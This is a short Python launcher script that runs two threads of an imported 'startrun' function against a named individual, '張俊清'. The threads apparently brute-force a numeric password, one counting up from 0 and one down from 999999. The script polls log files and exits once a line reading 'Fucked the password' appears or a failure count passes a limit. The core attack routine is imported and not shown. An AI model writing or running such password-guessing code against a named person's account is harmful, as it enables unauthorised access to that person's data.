import os
import time
from threading import Thread

from init import startrun

target = '張俊清'

t1 = Thread(target=startrun, args=(0,target,True))
t1.daemon = True
t1.start()
t2 = Thread(target=startrun, args=(999999,target,False))
t2.daemon = True
t2.start()
print('run')

while True:
    try:
        if 'Fucked the password' in str(open('log.txt', 'r').read()):
            os._exit(0)
        if int(open('failed.txt','r').read()) > int(open('failedf.txt','r').read()):
            os._exit(0)
    except:
        pass
    time.sleep(1)